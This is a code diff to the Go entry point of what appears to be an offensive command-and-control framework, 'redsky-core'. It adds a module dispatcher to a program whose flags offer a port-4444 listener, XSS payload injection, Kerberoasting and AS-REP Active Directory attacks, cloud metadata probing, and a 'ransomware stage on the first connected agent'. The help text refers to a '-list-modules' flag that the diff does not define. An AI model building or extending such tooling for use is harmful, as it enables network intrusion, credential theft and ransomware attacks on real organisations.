@@ -39,6 +39,12 @@ import (
 
 func main() {
 	bind := flag.String("bind", "0.0.0.0", "listen address")
+	// Registry door — dispatch any runXxxDispatch function by name.
+	// Example: redsky-core -module cloud -args '{"action":"imds_probe"}'
+	moduleName := flag.String("module", "", "run a registered module by name (see -list-modules); -args carries JSON")
+	moduleArgs := flag.String("args", "{}", "JSON args for -module")
+	moduleHelp := flag.Bool("module-help", false, "list every registered module and exit")
+
 	port := flag.Int("port", 4444, "listen port")
 	eng := flag.String("engagement", "default", "engagement name")
 	pluginFlag := flag.String("plugin", "", "run a local plugin instead of listening")
@@ -150,9 +156,6 @@ func main() {
 	webXSSJS := flag.String("webxss-js", "alert(1)", "JS body to substitute into {JS}")
 	webXSSFPs := flag.Bool("webxss-fingerprints", false, "list framework fingerprint markers instead")
 	adEnum := flag.String("adenum", "", "AD enumeration action: rootdse|domain|users|groups|computers|gpos|trusts|asrep|kerberoast|unconstrained|pwdnotreq|laps|adcs")
-	moduleName := flag.String("module", "", "dispatch a named core module (see -module-help)")
-	moduleArgs := flag.String("args", "", "JSON args for -module, e.g. '{\"action\":\"imds\",\"provider\":\"aws\"}'")
-	moduleHelp := flag.Bool("module-help", false, "list every registered core module and exit")
 	adHost := flag.String("ad-host", "", "domain controller ip/hostname")
 	adPort := flag.Int("ad-port", 389, "LDAP port (389 or 636)")
 	adTLS := flag.Bool("ad-tls", false, "use LDAPS")
@@ -458,6 +461,17 @@ func main() {
 	}
 
 	// crypto dispatch — ransomware stage on the first connected agent
+	if *moduleName != "" {
+		m, ok := regLookup(*moduleName)
+		if !ok {
+			log.Fatalf("unknown module %q — run with -list-modules to see the table", *moduleName)
+		}
+		if err := m.Run(mgr, []byte(*moduleArgs)); err != nil {
+			log.Fatalf("module %s: %v", *moduleName, err)
+		}
+		return
+	}
+
 	if *cryptoRoot != "" {
 		if *cryptoPub == "" {
 			log.Printf("[crypto] -crypto-pub <path> required")
